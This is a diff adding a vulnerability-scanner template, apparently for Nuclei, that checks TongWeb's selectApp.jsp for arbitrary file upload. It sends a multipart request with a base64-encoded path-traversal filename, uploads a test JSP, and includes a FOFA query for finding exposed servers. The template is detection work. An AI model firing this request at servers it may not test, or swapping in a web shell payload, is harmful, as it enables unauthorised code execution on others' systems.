@@ -1,0 +1,54 @@
+id: tong-web-selectapp-fileupload
+
+info:
+  name: tong-web-selectapp-fileupload
+  author: yy
+  severity: high
+  description: 东方通web selectApp.jsp存在任意文件上传漏洞。
+  tags: tong,fileupload
+  metadata:
+    fofa-qeury: header="TongWeb Server"
+    veified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |              
+        POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1
+        Host: 
+        Content-Type: multipart/form-data; boundary=fa2ef860e94d564632e291131d20064c
+        User-Agent: Mozilla/5.0 
+
+        --fa2ef860e94d564632e291131d20064c
+        Content-Disposition: form-data; name="app_fileName"
+
+        Li4vLi4vYXBwbGljYXRpb25zL2hlaW1kYWxsLzEyM3F3ZTEuanNw
+        --fa2ef860e94d564632e291131d20064c
+        Content-Disposition: form-data; name="app"
+
+
+        --fa2ef860e94d564632e291131d20064c
+        Content-Disposition: form-data; name="className"
+
+        test
+        --fa2ef860e94d564632e291131d20064c
+        Content-Disposition: form-data; name="uploadApp"; filename="test.jar"
+        Content-Type: application/java-archive
+
+        <% out.println(16156223+223415616); %>
+        --fa2ef860e94d564632e291131d20064c--
+
+      - |              
+        GET /{{fileupload}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+
+    payloads:
+      fileupload:
+        - "heimdall/123qwe1.jsp"
+               
+    matchers:     
+      - type: dsl
+        name: fileupload
+        dsl:
+          - "status_code_2 == 200 && contains(body_2,'239571839') && contains(header,'text/html')" 
